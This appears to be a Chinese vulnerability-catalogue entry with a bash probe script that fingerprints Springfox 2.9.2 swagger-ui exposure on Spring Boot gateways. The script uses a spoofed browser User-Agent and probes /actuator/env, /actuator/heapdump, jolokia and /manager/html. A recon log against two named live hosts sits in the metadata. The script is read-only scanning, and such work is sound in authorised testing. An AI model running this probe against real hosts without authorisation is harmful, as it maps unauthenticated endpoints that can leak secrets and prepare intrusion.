# Spring Boot + Springfox 2.9.2 网关未授权暴露 swagger-ui.html 静态壳与 webjars（版本钉死 + 自定义 404 吞文档清单的判据）

- **code**: spring-boot-springfox-swagger-ui-static-shell-unauth-version
- **kind**: script
- **category**: info-leak
- **component**: Spring Boot 2.x + springfox-swagger-ui 2.9.2
- **versions**: springfox 2.9.2（Spring Boot 2.x 世代）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-04 16:47–17:05 UTC 在 task#614 的两台上传网关（57632 端口，两域名互备）实测：① GET /swagger-ui.html → HTTP 200 / text/html; charset=utf-8 / Content-Length 3318 / 体 sha256[:16]=18C9F05D09837277，含 <title>Swagger UI</title> 与 webjars/springfox-swagger-ui/springfox.css?v=2.9.2、swagger-ui-bundle.js?v=2.9.2、springfox.js?v=2.9.2；② 两台主机响应体逐字节相同（同一份制品，非单点失误）；③ GET /webjars/springfox-swagger-ui/springfox.js?v=2.9.2 → 200 / 96207B / application/javascript，证明静态资源由 Spring 后端直服（Server 头显示的 Microsoft-IIS 为前置伪造）；④ 阴性对照成立：/v2/api-docs?group=default、/swagger-resources、/swagger-resources/configuration/security 与 /actuator/env、/actuator/heapdump、/actuator/mappings、/actuator/jolokia、/manager/html 全部返回 200 / 38B / {"code":0,"message":"接口不存在"}（sha16=72B133CE74D79DF9），即被应用统一 404 处理器吞掉，故未泄露 API 清单与 actuator 数据，据此按 low 定性而非 high。全程只读 GET、无爆破无 POST、请求间隔 ≥6s、出口固定 proxy auto_off。
- **path**: pocs/spring-boot-springfox-swagger-ui-static-shell-unauth-version/swagger_static_shell_probe.sh
- **tags**: swagger, springfox, spring-boot, webjars, swagger-ui, info-leak, version-fingerprint, actuator, 404-baseline, upload-gateway
- **created_at**: 2026-11-04T16:56:54.378Z
- **engine**: https://ga7o.h86l3w.com:57632（同型 https://sjan.o0hyfmi.club:57632）
- **found_by**: recon

## 描述

Spring Boot 后端把 springfox-swagger-ui 的静态资源（/swagger-ui.html 与 /webjars/springfox-swagger-ui/*）直接暴露在网关外，无需凭据即可读取，从而把框架精确版本钉死在 springfox 2.9.2（⇒ Spring Boot 2.x）。但应用自带的统一异常/404 处理器会吞掉 /v2/api-docs、/swagger-resources*、/actuator/*，一律返回 200 + 固定的短 JSON（如 {"code":0,"message":"接口不存在"}），所以本漏洞默认只泄露「UI 壳 + 组件版本」，不等于 API 清单泄露。要判定到底泄露了多少，必须用「基线字节数/shahash 反证」区分真命中与兜底。

## 用法

```
bash swagger_static_shell_probe.sh <host> <port>
例：bash swagger_static_shell_probe.sh ga7o.example.com 57632
判据（三步缺一不可）：
1) GET /swagger-ui.html → 200，体含 <title>Swagger UI</title> 且引用 webjars/springfox-swagger-ui/springfox.css?v=<版本> —— 版本从这里直接读；
2) GET /webjars/springfox-swagger-ui/springfox.js?v=<版本> → 200 且是大体积 JS（本例 96207B）—— 证明静态资源由 Spring 后端而非反向代理镜像服务；
3) 阴性对照：先取一条不存在路径（如 /__nope__）的响应作为「兜底基线」（字节数 + sha），再打 /v2/api-docs?group=default、/swagger-resources、/swagger-resources/configuration/security、/actuator/env、/actuator/heapdump、/actuator/mappings、/actuator/jolokia、/manager/html。凡与基线完全同长同 sha 的，一律判为「应用 404 处理器吞掉」= 未暴露，不得报漏洞。
升级条件：只要 /v2/api-docs 返回 200 且内容是带 paths/definitions 的 Swagger JSON（长度远大于基线），立刻改判为「全量 API 清单未授权泄露」，按高危处理。
注意：Server 头可能是前置 IIS/nginx 伪造（本例 Microsoft-IIS 而实际是 Spring），不要用 Server 头判框架；export 代理固定 + 请求间隔 ≥6s。
```

## 正文

```
#!/usr/bin/env bash
# Spring Boot / Springfox 静态壳未授权暴露探针（只读 GET，不含任何写操作）
# 用法: bash swagger_static_shell_probe.sh <host> <port> [http|https]
set -u
HOST="${1:?host}"; PORT="${2:?port}"; SCHEME="${3:-https}"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
BASE="$SCHEME://$HOST:$PORT"

get() {  # get <path> <outfile>  -> 打印 status / len / sha16 / content-type
  local p="$1" f="$2"
  curl -k -s -D "$f.h" -o "$f" --http1.1 --max-time 25 \
       -A "$UA" -H 'Accept: */*' -H 'Connection: close' "$BASE$p"
  local code len ct sha
  code=$(head -1 "$f.h" | awk '{print $2}')
  len=$(wc -c < "$f" | tr -d ' ')
  ct=$(grep -i '^content-type:' "$f.h" | tr -d '\r' | cut -d' ' -f2-)
  sha=$(sha256sum "$f" | cut -c1-16)
  printf '%-46s %s  %8sB  %s  %s\n' "$p" "${code:-ERR}" "$len" "$sha" "$ct"
}

echo "== [0] 404 兜底基线（必须先取，后面全靠它反证） =="
get "/__artex_nope__" base404.bin
BASE_LEN=$(wc -c < base404.bin | tr -d ' ')
BASE_SHA=$(sha256sum base404.bin | cut -c1-16)
echo "baseline: ${BASE_LEN}B sha16=${BASE_SHA}  body=$(head -c 200 base404.bin)"
echo

echo "== [1] swagger-ui 静态壳（命中=版本泄露成立） =="
get "/swagger-ui.html" swui.html
grep -oE 'springfox[^"'\'']*\.(css|js)\?v=[0-9][^"'\'']*' swui.html | sort -u
grep -oE '<title>[^<]*</title>' swui.html
echo

echo "== [2] webjars 静态资源（大体积 JS 证明由 Spring 后端直服） =="
VER=$(grep -oE 'springfox\.js\?v=[0-9.]+' swui.html | head -1 | cut -d= -f2)
VER="${VER:-2.9.2}"
get "/webjars/springfox-swagger-ui/springfox.js?v=$VER" springfox.js
echo

echo "== [3] 文档清单面：与基线同长同 sha ⇒ 被应用 404 处理器吞掉（未泄露） =="
for p in "/v2/api-docs" "/v2/api-docs?group=default" "/swagger-resources" \
         "/swagger-resources/configuration/security" "/swagger-resources/configuration/ui" \
         "/swagger-ui/index.html" "/doc.html"; do
  get "$p" "x_$(echo "$p" | tr '/?=&' '____').bin"
  L=$(wc -c < "x_$(echo "$p" | tr '/?=&' '____').bin" | tr -d ' ')
  S=$(sha256sum "x_$(echo "$p" | tr '/?=&' '____').bin" | cut -c1-16)
  if [ "$L" = "$BASE_LEN" ] && [ "$S" = "$BASE_SHA" ]; then
    echo "    ^^ 判定: SWALLOWED (等于基线) → 不成立"
  else
    echo "    ^^ 判定: 与基线不同 → 人工看内容，出现 paths/definitions 即 API 清单泄露"
  fi
  sleep 6
done

echo
echo "== [4] actuator / 管理面（同样用基线反证） =="
for p in "/actuator" "/actuator/env" "/actuator/heapdump" "/actuator/mappings" \
         "/actuator/jolokia" "/actuator/jolokia/list" "/druid/index.html" "/manager/html"; do
  get "$p" "a_$(echo "$p" | tr '/?' '__').bin"
  L=$(wc -c < "a_$(echo "$p" | tr '/?' '__').bin" | tr -d ' ')
  S=$(sha256sum "a_$(echo "$p" | tr '/?' '__').bin" | cut -c1-16)
  [ "$L" = "$BASE_LEN" ] && [ "$S" = "$BASE_SHA" ] \
    && echo "    ^^ 判定: SWALLOWED → 未暴露" \
    || echo "    ^^ 判定: 与基线不同 → 打开文件确认是否真 actuator/heapdump（heapdump 应为 MB 级）"
  sleep 6
done

```
